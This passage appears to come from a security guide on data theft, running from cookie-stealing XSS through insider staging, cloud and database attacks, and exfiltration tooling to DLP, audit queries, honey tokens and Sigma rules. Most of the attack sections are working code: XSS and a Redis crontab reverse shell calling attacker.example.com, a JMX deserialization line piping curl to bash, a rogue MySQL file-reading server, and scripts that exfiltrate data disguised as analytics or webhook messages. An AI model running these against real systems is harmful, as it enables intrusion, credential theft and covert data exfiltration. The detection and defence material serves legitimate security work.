fetch('https://attacker.example.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// If HttpOnly is set, steal via service worker or DOM access
<script>
new Image().src = 'https://attacker.example.com/steal?c=' + document.cookie;
</script>
```

**Session fixation**: the attacker sets a known session ID before the victim authenticates:

```http
-- Attacker obtains a valid session ID
GET /login HTTP/1.1
Set-Cookie: SESSIONID=attacker_controlled_value

-- Attacker forces this session ID on the victim (via URL parameter, XSS, or meta tag)
https://target.example.com/login?SESSIONID=attacker_controlled_value

-- After victim authenticates, the attacker uses the same session ID
```

### 5.5 OAuth Token Theft

- **Authorization code interception**: if redirect_uri validation is weak, the attacker registers a redirect URI they control and captures the authorization code.
- **Token leakage via Referer header**: tokens in URL fragments can leak through Referer headers when navigating to external pages.
- **Implicit flow exploitation**: deprecated but still found — tokens returned directly in URL fragments are vulnerable to interception.

### 5.6 API Key Exposure

API keys and secrets are routinely committed to public repositories, embedded in client-side code, or included in Docker images.

**Searching for exposed keys:**

```bash
# GitHub search for AWS keys (trufflehog or manual)
trufflehog github --org=target-org --only-verified

# Search Docker Hub images
docker pull target/app:latest
docker history --no-trunc target/app:latest | grep -i "key\|secret\|password\|token"

# Search for secrets in JavaScript bundles
curl -s https://target.example.com/static/js/main.*.js | \
    grep -oE '(AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{48}|ghp_[a-zA-Z0-9]{36})'
```

**Sigma rule for detecting compromised API key usage:**

```yaml
title: AWS API Call from Unusual Source IP
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects AWS API calls using known compromised access keys from external IPs
logsource:
    product: aws
    service: cloudtrail
detection:
    selection:
        eventSource: '*'
        sourceIPAddress|cidr:
            - '0.0.0.0/0'
        userIdentity.accessKeyId:
            - 'AKIA...'  # Known compromised key
    filter:
        sourceIPAddress|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
    condition: selection and not filter
level: critical
```

### 5.7 MFA Bypass Techniques

- **Real-time phishing proxies** (evilginx2, modlishka): capture session tokens after MFA completion
- **SIM swapping**: social engineering mobile carriers to redirect SMS MFA codes
- **MFA fatigue / push bombing**: repeatedly triggering push notifications until the user approves out of frustration
- **Adversary-in-the-middle with device code flow**: using OAuth device code flow to capture tokens without intercepting the actual login
- **Recovery code theft**: targeting backup/recovery codes stored insecurely
- **SS7 interception**: intercepting SMS-based MFA codes at the telecom protocol level (state-level capability)

---

## 6. Insider Data Theft

### 6.1 Insider Threat Indicators

Behavioral indicators (observable without technical monitoring):
- Working unusual hours without justification
- Expressing dissatisfaction, financial stress, or plans to leave
- Requesting access to systems/data outside normal job function
- Resistance to security controls or policy changes
- Unusual interest in sensitive projects not within scope of work

Technical indicators (observable through monitoring):
- Mass file downloads or copy operations
- Large email attachments to personal accounts
- USB device connections on machines that don't require them
- Unusual database query patterns (SELECT * from sensitive tables)
- VPN connections during off-hours followed by bulk data access
- Access to file shares or databases not required for role
- Use of encryption tools not standard in the organization

### 6.2 Data Staging Techniques

Before exfiltration, insiders typically stage data — collecting, compressing, and sometimes encrypting it.

```bash
# Staging: collect sensitive files into a temp directory
find /mnt/shared/finance -name "*.xlsx" -newer /tmp/marker -exec cp {} /tmp/.staging/ \;

# Compress to reduce size and rename to look benign
cd /tmp/.staging
tar czf ../system_update_2026.tar.gz *

# Encrypt before exfiltration (to bypass DLP content inspection)
openssl enc -aes-256-cbc -salt -in system_update_2026.tar.gz \
    -out system_update_2026.bin -pass pass:ExfilP@ss2026

# Split into chunks to avoid size-based alerts
split -b 5M system_update_2026.bin chunk_
```

### 6.3 Exfiltration Methods

**USB exfiltration**: the most direct method. Organizations counter with USB device control policies, but insiders with physical access to machines may bypass these through BIOS changes or bootable media.

**Email exfiltration**: sending data to personal email accounts, either as attachments or base64-encoded in the message body. Sophisticated insiders may use personal email via webmail in a browser, bypassing email DLP that only inspects SMTP traffic.

**Cloud storage exfiltration**: uploading to personal Dropbox, Google Drive, OneDrive, or any file-sharing service. This is particularly difficult to detect when the organization uses the same service (e.g., corporate OneDrive vs. personal OneDrive).

**Print/screenshot exfiltration**: printing sensitive documents or taking photos/screenshots of screens. Extremely difficult to detect technically; requires physical security controls and document watermarking.

### 6.4 Steganography for Data Hiding

```python
#!/usr/bin/env python3
"""LSB steganography — hiding data in image files.
Demonstration of technique used by insiders to hide exfiltrated data."""

from PIL import Image
import struct

def hide_data(image_path: str, data: bytes, output_path: str) -> None:
    img = Image.open(image_path)
    pixels = list(img.getdata())

    # Prepend length header
    length_header = struct.pack(">I", len(data))
    all_bits = "".join(format(byte, "08b") for byte in length_header + data)

    if len(all_bits) > len(pixels) * 3:
        raise ValueError("Data too large for carrier image")

    new_pixels = []
    bit_idx = 0
    for pixel in pixels:
        new_pixel = list(pixel[:3])
        for channel in range(3):
            if bit_idx < len(all_bits):
                new_pixel[channel] = (new_pixel[channel] & 0xFE) | int(all_bits[bit_idx])
                bit_idx += 1
        new_pixels.append(tuple(new_pixel) + pixel[3:] if len(pixel) > 3 else tuple(new_pixel))

    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_path)

def extract_data(image_path: str) -> bytes:
    img = Image.open(image_path)
    pixels = list(img.getdata())

    bits = []
    for pixel in pixels:
        for channel in range(3):
            bits.append(str(pixel[channel] & 1))

    # Read length header (first 32 bits)
    length = struct.unpack(">I", int("".join(bits[:32]), 2).to_bytes(4, "big"))[0]

    # Read data
    data_bits = bits[32:32 + length * 8]
    data_bytes = bytes(int("".join(data_bits[i:i+8]), 2)
                       for i in range(0, len(data_bits), 8))
    return data_bytes
```

### 6.5 DLP Bypass Techniques

- **Encoding**: base64, hex encoding, ROT13, custom encoding schemes that evade signature-based DLP
- **Splitting**: dividing sensitive data across multiple exfiltration channels (partial SSNs in different emails)
- **Metadata embedding**: hiding data in document metadata (EXIF, PDF properties, Office custom properties)
- **Renaming**: changing file extensions (`.xlsx` to `.png`) to bypass file-type filtering
- **Encryption**: encrypted archives bypass content-inspection DLP entirely
- **Screenshot/OCR**: converting data to images defeats text-based DLP
- **Slow drip**: exfiltrating small quantities below threshold-based DLP alerts

### 6.6 Detecting Insider Exfiltration

**UEBA (User and Entity Behavior Analytics)** establishes baseline behavior for each user and alerts on deviations:
- Unusual data volume accessed or downloaded
- Access to systems outside normal pattern
- Login anomalies (time, location, device)

**Database activity monitoring query for anomalous mass reads:**

```sql
-- PostgreSQL: identify users running unusually large SELECT queries
SELECT usename, query, calls, rows,
       total_exec_time / 1000.0 AS total_sec
FROM pg_stat_statements
WHERE query ILIKE 'SELECT%'
  AND rows > 10000
ORDER BY rows DESC
LIMIT 50;
```

**Network monitoring for bulk data transfer:**

```bash
# Suricata rule: large outbound data transfer
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Large Outbound Data Transfer";
    flow:to_server,established;
    dsize:>1400;
    threshold: type both, track by_src, count 1000, seconds 300;
    sid:2100030; rev:1;)
```

---

## 7. Cloud Data Breaches

### 7.1 Misconfigured Storage

Publicly accessible cloud storage is the lowest-hanging fruit in cloud security and has caused some of the largest data exposures.

**AWS S3 bucket enumeration and access:**

```bash
# Enumerate bucket existence
aws s3 ls s3://target-company-backup --no-sign-request 2>/dev/null && echo "PUBLIC"

# List contents of public bucket
aws s3 ls s3://target-company-backup --no-sign-request --recursive

# Download all contents
aws s3 sync s3://target-company-backup ./loot --no-sign-request
```

**GCS (Google Cloud Storage):**

```bash
# Check if bucket is publicly listable
curl -s "https://storage.googleapis.com/storage/v1/b/target-bucket/o" | python3 -m json.tool

# Download objects
curl -s "https://storage.googleapis.com/target-bucket/database_backup.sql.gz" -o backup.sql.gz
```

**Azure Blob Storage:**

```bash
# Check if container allows anonymous listing
curl -s "https://targetaccount.blob.core.windows.net/data?restype=container&comp=list"

# Download blob
curl -s "https://targetaccount.blob.core.windows.net/data/customers.csv" -o customers.csv
```

**Automated cloud storage scanner (Python):**

```python
#!/usr/bin/env python3
"""Cloud storage misconfiguration scanner.
Authorized testing only."""

import boto3
import requests
from botocore import UNSIGNED
from botocore.config import Config

WORDLIST = ["backup", "data", "staging", "dev", "prod", "logs",
            "uploads", "assets", "static", "database", "db-backup"]

def check_s3(company: str) -> list[str]:
    s3 = boto3.client("s3", config=Config(signature_version=UNSIGNED))
    open_buckets = []
    for word in WORDLIST:
        bucket = f"{company}-{word}"
        try:
            s3.list_objects_v2(Bucket=bucket, MaxKeys=1)
            open_buckets.append(f"s3://{bucket}")
            print(f"[+] S3 OPEN: {bucket}")
        except s3.exceptions.NoSuchBucket:
            pass
        except Exception:
            pass  # AccessDenied = exists but not public
    return open_buckets

def check_gcs(company: str) -> list[str]:
    open_buckets = []
    for word in WORDLIST:
        bucket = f"{company}-{word}"
        url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            open_buckets.append(f"gs://{bucket}")
            print(f"[+] GCS OPEN: {bucket}")
    return open_buckets

def check_azure(company: str) -> list[str]:
    open_containers = []
    for word in WORDLIST:
        account = f"{company}{word}"
        url = f"https://{account}.blob.core.windows.net/data?restype=container&comp=list"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and "<Blob>" in resp.text:
            open_containers.append(f"az://{account}/data")
            print(f"[+] Azure OPEN: {account}")
    return open_containers
```

### 7.2 SSRF to Cloud Metadata — Credential Harvesting

Server-Side Request Forgery (SSRF) targeting cloud instance metadata services is the most common path from application vulnerability to cloud credential theft.

**AWS metadata service (IMDSv1 — unpatched):**

```bash
# Retrieve IAM role credentials via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get the role name first
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite

# Response contains temporary credentials:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2026-05-07T12:00:00Z"
# }
```

**GCP metadata service:**

```bash
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Azure IMDS:**

```bash
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
```

The Capital One breach (2019) used precisely this pattern: an SSRF vulnerability in a WAF allowed the attacker to retrieve IAM role credentials from the EC2 metadata service, then used those credentials to access S3 buckets containing 100 million customer records.

**Mitigation**: Enforce IMDSv2 (requires session token via PUT request), use network policies to restrict metadata access, and apply least-privilege IAM roles.

### 7.3 Cross-Tenant Data Access

In multi-tenant SaaS environments, isolation failures can expose data across tenants:

- **Shared database with tenant_id filtering**: if a query fails to include `WHERE tenant_id = ?`, data from all tenants is returned. This is functionally identical to an IDOR but in a multi-tenant context.
- **Shared storage with predictable paths**: if tenant data is stored at `/data/{tenant_id}/`, and tenant_id is predictable, one tenant can access another's data.
- **Metadata service exploitation**: in Kubernetes multi-tenant clusters, a pod in one namespace may be able to access the cloud metadata service and obtain credentials with cluster-wide or cross-namespace permissions.

### 7.4 Backup Exposure

Database backups stored in cloud storage are frequently overlooked during security hardening:

```bash
# Common backup naming patterns to search for
# {company}-db-backup-YYYY-MM-DD.sql.gz
# {company}-production-{date}.dump
# {company}-mysql-backup.tar.gz

# Searching for exposed backups
aws s3 ls s3://company-backups/ --no-sign-request --recursive | grep -i "dump\|backup\|sql\|mongo"
```

### 7.5 Shadow IT and Unauthorized Cloud Data Stores

Employees and teams often create cloud resources outside of IT governance:
- Personal AWS accounts hosting company data
- Firebase databases created for quick prototyping, left running
- Heroku apps with production data in development configs
- Airtable, Notion, or Google Sheets containing sensitive data

Discovery requires cloud access security brokers (CASBs) and network-level visibility into SaaS application usage.

### 7.6 API Credential Leakage

Cloud API credentials (AWS access keys, GCP service account JSON, Azure tenant credentials) frequently leak through:
- Public GitHub repositories (historically the #1 source)
- Client-side JavaScript bundles
- Mobile application binaries (decompilable)
- Docker images and container registries
- CI/CD pipeline logs and configuration files
- Stack traces and error pages

```bash
# Search for leaked AWS keys in a codebase
grep -rn "AKIA[0-9A-Z]\{16\}" --include="*.py" --include="*.js" --include="*.yml" .

# Search for GCP service account keys
grep -rn "\"type\": \"service_account\"" --include="*.json" .

# Search for Azure secrets
grep -rn "DefaultEndpointsProtocol=https;AccountName=" --include="*.config" --include="*.json" .
```

---

## 8. Database-Specific Attack Techniques

### 8.1 MongoDB — Authentication Bypass and Default Config

MongoDB historically shipped with no authentication enabled and listening on all interfaces (0.0.0.0:27017). While modern versions have improved defaults, thousands of misconfigured instances remain exposed.

```python
#!/usr/bin/env python3
"""MongoDB unauthenticated enumeration and data extraction.
For authorized testing only."""

from pymongo import MongoClient

TARGET = "mongodb://target.example.com:27017"

def enumerate_mongo(uri: str) -> None:
    client = MongoClient(uri, serverSelectionTimeoutMS=5000)
    try:
        dbs = client.list_database_names()
        print(f"[+] Connected. Databases: {dbs}")
        for db_name in dbs:
            if db_name not in ("admin", "local", "config"):
                db = client[db_name]
                collections = db.list_collection_names()
                print(f"  [{db_name}] Collections: {collections}")
                for coll_name in collections:
                    count = db[coll_name].count_documents({})
                    sample = db[coll_name].find_one()
                    keys = list(sample.keys()) if sample else []
                    print(f"    {coll_name}: {count} docs, fields: {keys}")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    enumerate_mongo(TARGET)
```

**Shodan search for exposed MongoDB instances:**

```
port:27017 product:"MongoDB" -authentication
```

Case study: In 2017, the "MongoDB Apocalypse" saw attackers scan the internet for unauthenticated MongoDB instances, delete all data, and leave ransom notes. Over 28,000 databases were affected.

### 8.2 Elasticsearch — Unauthenticated API Access

Elasticsearch clusters without X-Pack security (or with security disabled) expose a REST API that allows full data access.

```bash
# Check if Elasticsearch is accessible
curl -s http://target.example.com:9200/ | python3 -m json.tool

# List all indices
curl -s http://target.example.com:9200/_cat/indices?v

# Dump all documents from an index
curl -s "http://target.example.com:9200/customers/_search?size=10000&pretty"

# Scroll API for large datasets (>10,000 documents)
curl -s -X POST "http://target.example.com:9200/customers/_search?scroll=1m" \
    -H "Content-Type: application/json" \
    -d '{"size": 5000, "query": {"match_all": {}}}'

# Continue scrolling with scroll_id from response
curl -s -X POST "http://target.example.com:9200/_search/scroll" \
    -H "Content-Type: application/json" \
    -d '{"scroll": "1m", "scroll_id": "<scroll_id_from_previous_response>"}'

# Query for specific sensitive data
curl -s -X POST "http://target.example.com:9200/users/_search" \
    -H "Content-Type: application/json" \
    -d '{
      "query": {"wildcard": {"email": {"value": "*@*"}}},
      "size": 10000,
      "_source": ["email", "name", "ssn", "phone"]
    }'
```

### 8.3 Redis — Unauthenticated Access and Data Copy

Redis, when exposed without authentication, allows arbitrary key enumeration and data extraction.

```bash
# Connect to unauthenticated Redis
redis-cli -h target.example.com -p 6379

# Check if authentication is required
> PING
# Response: PONG (no auth) or NOAUTH (auth required)

# Enumerate all keys (WARNING: blocks on large databases)
> KEYS *

# Or use SCAN for non-blocking enumeration
> SCAN 0 COUNT 100

# Dump specific key types
> TYPE session:user:1337
> GET session:user:1337
> HGETALL user:1337
> SMEMBERS admin_users

# SLAVEOF attack: replicate all data to attacker-controlled Redis
> SLAVEOF attacker.example.com 6379
# All data is now replicated to the attacker's Redis instance
```

**Redis RCE via module loading or SLAVEOF + crontab write:**

```bash
# Write crontab for reverse shell (Linux, requires CONFIG SET dir/dbfilename)
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename root
> SET payload "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'\n\n"
> SAVE
```

### 8.4 PostgreSQL — COPY TO and Large Object Exploitation

```sql
-- Read arbitrary files (requires superuser or pg_read_server_files)
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';

-- Alternative: CREATE TABLE, COPY FROM file, SELECT from table
CREATE TEMP TABLE file_contents (content TEXT);
COPY file_contents FROM '/etc/passwd';
SELECT * FROM file_contents;

-- Large object exploitation for arbitrary file read/write
SELECT lo_import('/etc/passwd', 31337);
SELECT encode(lo_get(31337), 'escape');

-- Large object for arbitrary file write
SELECT lo_from_bytea(31338, decode('...payload_hex...', 'hex'));
SELECT lo_export(31338, '/tmp/payload.so');

-- Command execution via custom function (if CREATE FUNCTION is available)
CREATE OR REPLACE FUNCTION cmd_exec(cmd TEXT) RETURNS TEXT AS $$
BEGIN
    RETURN (SELECT STRING_AGG(content, E'\n') FROM
        (SELECT content FROM pg_read_file(cmd, 0, 1000000) AS content) AS t);
END;
$$ LANGUAGE plpgsql;
```

### 8.5 MySQL — LOCAL INFILE for Client-Side File Read

The `LOAD DATA LOCAL INFILE` feature can be weaponized by a rogue MySQL server to read files from connecting clients.

**Rogue MySQL server concept:**

When a MySQL client connects and the server requests `LOAD DATA LOCAL INFILE '/etc/passwd'`, the client reads the specified file from its own filesystem and sends it to the server. This is a design feature, not a bug — but a malicious server can exploit it.

```python
#!/usr/bin/env python3
"""Rogue MySQL server — reads files from connecting clients.
Educational/authorized testing only. Demonstrates CVE-2019-15224 class."""

import socket
import struct

LISTEN_PORT = 3306
TARGET_FILE = "/etc/passwd"

def create_greeting() -> bytes:
    """Create a MySQL server greeting packet."""
    payload = b"\x0a"  # Protocol version
    payload += b"5.7.99-rogue\x00"  # Server version
    payload += struct.pack("<I", 1)  # Connection ID
    payload += b"AAAAAAAA\x00"  # Auth plugin data part 1
    payload += struct.pack("<H", 0xFFFF)  # Capability flags lower
    payload += b"\x21"  # Character set (utf8)
    payload += struct.pack("<H", 0x0002)  # Status flags
    payload += struct.pack("<H", 0x8000)  # Capability flags upper
    payload += b"\x15"  # Length of auth plugin data
    payload += b"\x00" * 10  # Reserved
    payload += b"BBBBBBBBBBBB\x00"  # Auth plugin data part 2
    payload += b"mysql_native_password\x00"  # Auth plugin name
    return struct.pack("<I", len(payload))[:3] + b"\x00" + payload

def create_load_infile_request(filename: str) -> bytes:
    """Request client to send a local file."""
    payload = b"\xfb" + filename.encode()
    return struct.pack("<I", len(payload))[:3] + b"\x00" + payload

def run_rogue_server() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", LISTEN_PORT))
    sock.listen(1)
    print(f"[*] Rogue MySQL server listening on port {LISTEN_PORT}")

    while True:
        conn, addr = sock.accept()
        print(f"[+] Connection from {addr}")
        conn.send(create_greeting())
        conn.recv(1024)  # Client auth response
        # Send OK to auth
        conn.send(b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
        conn.recv(1024)  # Client query (e.g., SELECT @@version)
        conn.send(create_load_infile_request(TARGET_FILE))
        file_data = conn.recv(65535)
        if len(file_data) > 4:
            print(f"[+] File contents from {addr}:")
            print(file_data[4:].decode(errors="replace"))
        conn.close()

if __name__ == "__main__":
    run_rogue_server()
```

### 8.6 Cassandra — Nodetool and JMX Exploitation

Apache Cassandra's management interface (nodetool via JMX) is frequently left unauthenticated on port 7199.

```bash
# Connect to unauthenticated JMX
nodetool -h target.example.com status

# Enumerate keyspaces
cqlsh target.example.com
> DESCRIBE KEYSPACES;
> DESCRIBE TABLES IN customer_data;
> SELECT * FROM customer_data.users LIMIT 100;

# Take a snapshot (creates backup files on the Cassandra node)
nodetool -h target.example.com snapshot customer_data

# JMX exploitation for remote code execution
# Using ysoserial + JMX for Java deserialization attacks
java -cp ysoserial.jar ysoserial.exploit.JMXInvokeMBean \
    target.example.com 7199 CommonsCollections6 "curl attacker.example.com/shell.sh | bash"
```

---

## 9. Data Exfiltration Techniques

### 9.1 Chunked Exfiltration

Dividing data into small chunks to avoid DLP detection thresholds.

```python
#!/usr/bin/env python3
"""Chunked data exfiltration — splits data into small segments
transmitted over time to avoid DLP thresholds.
Authorized testing only."""

import base64
import hashlib
import json
import random
import time
import requests

EXFIL_URL = "https://attacker.example.com/api/telemetry"
CHUNK_SIZE = 1024  # 1KB per chunk
MIN_DELAY = 30     # Minimum seconds between chunks
MAX_DELAY = 120    # Maximum seconds between chunks

def chunk_and_exfil(filepath: str) -> None:
    with open(filepath, "rb") as f:
        data = f.read()

    file_hash = hashlib.sha256(data).hexdigest()[:16]
    encoded = base64.b64encode(data).decode()
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

    for idx, chunk in enumerate(chunks):
        payload = {
            "event": "page_view",  # Disguised as analytics
            "session": file_hash,
            "page": f"/section/{idx}/{len(chunks)}",
            "referrer": chunk
        }
        try:
            requests.post(EXFIL_URL, json=payload, timeout=10)
        except requests.RequestException:
            pass

        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        time.sleep(delay)

if __name__ == "__main__":
    import sys
    chunk_and_exfil(sys.argv[1])
```

### 9.2 Encrypted Exfiltration Channels

Using C2 frameworks with built-in encryption to exfiltrate data:

```bash
# Cobalt Strike: download sensitive file through encrypted C2 channel
beacon> download C:\Users\admin\Documents\financial_report.xlsx

# Sliver C2: automated exfiltration
sliver> download /opt/database_export.csv
sliver> upload --process --encrypt-transit
```

Custom encrypted channel using standard tools:

```bash
# On compromised host: encrypt and transmit via HTTPS POST
tar czf - /path/to/sensitive/data | \
    openssl enc -aes-256-cbc -pass pass:Key2026 | \
    curl -X POST -H "Content-Type: application/octet-stream" \
    --data-binary @- https://attacker.example.com/upload
```

### 9.3 Legitimate Service Abuse

Using sanctioned cloud services as exfiltration channels makes detection extremely difficult because the traffic is to legitimate, commonly used domains.

```python
#!/usr/bin/env python3
"""Exfiltration via legitimate cloud services.
Demonstrates attacker technique for detection engineering.
Authorized testing only."""

import requests
import base64
import json

def exfil_via_slack_webhook(data: bytes, webhook_url: str) -> None:
    """Exfiltrate via Slack incoming webhook."""
    encoded = base64.b64encode(data).decode()
    payload = {
        "text": f"System health report:\n```{encoded}```"
    }
    requests.post(webhook_url, json=payload, timeout=10)

def exfil_via_discord_webhook(data: bytes, webhook_url: str) -> None:
    """Exfiltrate via Discord webhook."""
    encoded = base64.b64encode(data).decode()
    payload = {"content": f"```{encoded}```"}
    requests.post(webhook_url, json=payload, timeout=10)

def exfil_via_pastebin(data: bytes, api_key: str) -> str:
    """Exfiltrate via Pastebin API (requires free account)."""
    encoded = base64.b64encode(data).decode()
    payload = {
        "api_dev_key": api_key,
        "api_paste_code": encoded,
        "api_paste_private": "2",  # Unlisted
        "api_paste_expire_date": "1H",
        "api_option": "paste"
    }
    resp = requests.post("https://pastebin.com/api/api_post.php",
                         data=payload, timeout=10)
    return resp.text  # Returns paste URL
```

**Sigma rule for detecting exfiltration to paste sites:**

```yaml
title: Outbound Connection to Known Paste Sites
id: e1f2a3b4-c5d6-7890-ef12-345678901234
status: experimental
description: Detects outbound connections to paste sites commonly used for data exfiltration
logsource:
    category: proxy
    product: any
detection:
    selection:
        cs-host|endswith:
            - 'pastebin.com'
            - 'paste.ee'
            - 'hastebin.com'
            - 'paste.org'
            - 'controlc.com'
            - 'dpaste.com'
    filter:
        cs-username|contains: 'developer'  # Adjust to your environment
    condition: selection and not filter
level: medium
tags:
    - attack.exfiltration
    - attack.t1567
```

### 9.4 Time-Based Exfiltration

Slow-drip exfiltration spreads data transfer over days or weeks, staying below volume-based detection thresholds.

Characteristics:
- Transfer rates of 1–10 KB per hour
- Randomized intervals between transfers
- Traffic patterns mimicking legitimate user behavior
- Data embedded in normal-looking requests (analytics events, API calls, log submissions)

Detection requires baselining normal outbound data volumes per user/application and alerting on cumulative anomalies, not individual transfers.

### 9.5 Physical Exfiltration

**USB devices**: BadUSB devices can both exfiltrate data and deliver payloads. Rubber Ducky and similar HID-emulating devices can script rapid data collection and transfer.

```bash
# Rubber Ducky script example (DuckyScript) — stage and exfil via USB mass storage
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "Get-ChildItem C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Copy-Item -Destination D:\loot\ -Force"
ENTER
```

**Photography/screenshots**: photographing screens with a mobile phone camera is virtually undetectable by technical controls. Countermeasures include visual watermarking (unique per-user patterns), physical security (no phones in sensitive areas), and screen privacy filters.

### 9.6 Steganographic Exfiltration

Beyond the LSB technique shown in Section 6.4, advanced steganographic exfiltration includes:

- **Document steganography**: hiding data in whitespace (zero-width characters in Unicode text), font metrics, or formatting metadata
- **Audio steganography**: encoding data in audio spectrograms or LSBs of audio samples
- **Video steganography**: hiding data in video frames (higher capacity than images)
- **Protocol steganography**: encoding data in TCP/IP header fields, HTTPS padding, or TLS certificate extensions

**Detection**: statistical analysis tools like StegDetect, chi-square analysis for LSB embedding, and entropy analysis of outbound files.

---

## 10. Defense and Detection

### 10.1 DLP Architecture

Data Loss Prevention operates at three enforcement points:

**Network DLP** inspects traffic at the network perimeter:

```yaml
# Example: OpenDLP-style network DLP rule configuration
rules:
  - name: "Credit Card Number Detection"
    pattern: '\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b'
    action: block
    severity: critical
    luhn_validation: true  # Reduce false positives with Luhn check

  - name: "SSN Detection"
    pattern: '\b(?!000|666|9\d{2})\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b'
    action: alert
    severity: high

  - name: "Bulk PII Transfer"
    condition: match_count > 50
    window: 300  # 5 minutes
    action: block_and_alert
    severity: critical

  - name: "Encrypted Archive Outbound"
    file_signatures:
      - "504B0304"  # ZIP (may be encrypted)
      - "377ABCAF"  # 7z
      - "526172211A07"  # RAR
    condition: entropy > 7.5  # High entropy suggests encryption
    action: alert
    severity: medium
```

**Endpoint DLP** monitors data access and transfer at the endpoint level:
- File system monitoring (read/copy/move of classified files)
- Clipboard monitoring (copy/paste of sensitive data)
- Print monitoring
- USB device control
- Screen capture detection
- Application control (blocking unauthorized cloud storage clients)

**Cloud DLP** (CASB integration) monitors SaaS application usage:
- Shadow IT discovery
- Data classification in cloud storage
- Sharing policy enforcement
- OAuth token analysis

### 10.2 Database Activity Monitoring (DAM)

DAM solutions monitor and log all database queries, alerting on suspicious patterns.

**PostgreSQL audit logging configuration:**

```sql
-- Enable pgaudit extension
CREATE EXTENSION pgaudit;

-- Log all DML on sensitive tables
ALTER TABLE customers SET (pgaudit.log = 'read, write');
ALTER TABLE payment_cards SET (pgaudit.log = 'all');

-- Alert query for mass data reads
-- Run periodically or integrate with SIEM
SELECT usename, datname, query_start, state, query
FROM pg_stat_activity
WHERE state = 'active'
  AND query ILIKE '%SELECT%FROM%customers%'
  AND query NOT ILIKE '%LIMIT%'
  AND query NOT ILIKE '%WHERE%id%=%'
ORDER BY query_start;
```

**MySQL audit log analysis:**

```sql
-- Enable audit log (Enterprise or MariaDB Audit Plugin)
-- Then query for suspicious patterns:
SELECT event_time, user_host, command_type, argument
FROM mysql.general_log
WHERE command_type = 'Query'
  AND (argument LIKE '%SELECT * FROM%'
       OR argument LIKE '%INTO OUTFILE%'
       OR argument LIKE '%LOAD_FILE%'
       OR argument LIKE '%information_schema%')
  AND event_time > NOW() - INTERVAL 24 HOUR
ORDER BY event_time DESC;
```

**MSSQL monitoring query:**

```sql
-- Extended Events session for monitoring sensitive table access
CREATE EVENT SESSION [SensitiveDataAccess] ON SERVER
ADD EVENT sqlserver.sql_statement_completed(
    ACTION(sqlserver.username, sqlserver.client_hostname,
           sqlserver.database_name, sqlserver.sql_text)
    WHERE ([sqlserver].[sql_text] LIKE '%customers%'
        OR [sqlserver].[sql_text] LIKE '%credit_cards%'
        OR [sqlserver].[sql_text] LIKE '%employees%')
)
ADD TARGET package0.event_file(SET filename=N'SensitiveDataAccess')
WITH (MAX_MEMORY=4096 KB, STARTUP_STATE=ON);
```

### 10.3 Honey Tokens and Honey Data

Honey tokens are synthetic records or credentials planted in databases, file shares, and identity systems that serve no legitimate purpose. Any access to them triggers an alert, indicating unauthorized data access.

**Database honey records:**

```sql
-- Insert canary records into sensitive tables
INSERT INTO customers (id, first_name, last_name, email, ssn, account_type)
VALUES
    (999990001, 'John', 'Honeypot', 'john.honeypot@canary.example.com',
     '078-05-1120', 'CANARY'),  -- Known invalid SSN
    (999990002, 'Jane', 'Canary', 'jane.canary@trap.example.com',
     '219-09-9999', 'CANARY');

-- Create a view/trigger to alert on any access to canary records
CREATE OR REPLACE FUNCTION canary_alert()
RETURNS TRIGGER AS $$
BEGIN
    -- Log to dedicated audit table
    INSERT INTO security_alerts (alert_type, details, triggered_at, source_ip)
    VALUES ('CANARY_ACCESS',
            format('Canary record %s accessed. Query: %s',
                   NEW.id, current_query()),
            NOW(),
            inet_client_addr());

    -- Optionally send external alert via pg_notify
    PERFORM pg_notify('security_channel',
        json_build_object(
            'type', 'canary_access',
            'record_id', NEW.id,
            'query', current_query(),
            'user', current_user,
            'time', NOW()
        )::text
    );

    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

**Honey credentials** (AWS canary tokens):

```bash
# Create an IAM user with no permissions but CloudTrail logging enabled
aws iam create-user --user-name honey-admin-backup
aws iam create-access-key --user-name honey-admin-backup
# Store the access key ID/secret in locations likely to be found:
# - .env files
# - Configuration files
# - Source code comments
# Any API call using these credentials triggers a CloudTrail alert
```

**Sigma rule for honey token access:**

```yaml
title: AWS Honey Token Access Key Used
id: f1e2d3c4-b5a6-7890-1234-567890abcdef
status: production
description: Detects use of honey token AWS access key, indicating credential theft
logsource:
    product: aws
    service: cloudtrail
detection:
    selection:
        userIdentity.accessKeyId:
            - 'AKIAEXAMPLEHONEY01'
            - 'AKIAEXAMPLEHONEY02'
    condition: selection
